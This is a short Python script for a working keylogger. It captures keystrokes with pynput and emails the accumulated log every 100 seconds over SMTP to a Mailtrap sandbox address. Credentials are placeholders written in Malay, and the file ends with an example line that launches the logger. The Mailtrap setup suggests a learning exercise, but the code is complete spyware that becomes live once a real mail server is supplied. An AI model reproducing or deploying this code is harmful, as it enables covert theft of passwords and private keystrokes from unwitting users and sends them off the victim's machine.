#!/usr/bin/env python

import smtplib
import threading
from pynput import keyboard
import time

class KeyLogger:

    def __init__(self, time_interval: int, email: str, password: str) -> None:
        """
        :rtype: object
        """
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email
        self.password = password

    def append_to_log(self, string):
        """
        Append the captured key to the log.
        """
        assert isinstance(string, str)
        self.log += string

    def on_press(self, key):
        """
        Callback function to handle key press events.
        """
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False  # Exit the listener
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def send_mail(self, message):
        """
        Sends the captured keystrokes via email.
        """
        smtp_server = 'sandbox.smtp.mailtrap.io'
        smtp_port = 2525
        smtp_user = 'masukkan username mailtrap'
        smtp_password = 'masukkan password mailtrap'

        sender = "Ali Baba <from@siktauk.com>"
        receiver = "Kassim Baba <to@siktauk.com>"

        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        email_message = f"""\
Subject: Keylogger Report - {timestamp}
To: {receiver}
From: {sender}

{message}
"""
        try:
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_user, smtp_password)
                server.sendmail(sender, receiver, email_message)
                print("Email sent...")
        except Exception as e:
            print(f"Error sending email: {e}")

    def report_n_send(self) -> str:
        """
        Send the current log and clear it.
        """
        self.send_mail(self.log)
        self.log = ""  # Clear the log after sending
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    def start(self) -> str:
        """
        Start the keylogger and begin sending periodic reports.
        """
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report_n_send()  # Start sending emails periodically
            keyboard_listener.join()

# Example usage
laksasarawak = KeyLogger(100, 'Username', 'Pssword')  #mailtrap username,pswd
laksasarawak.start()
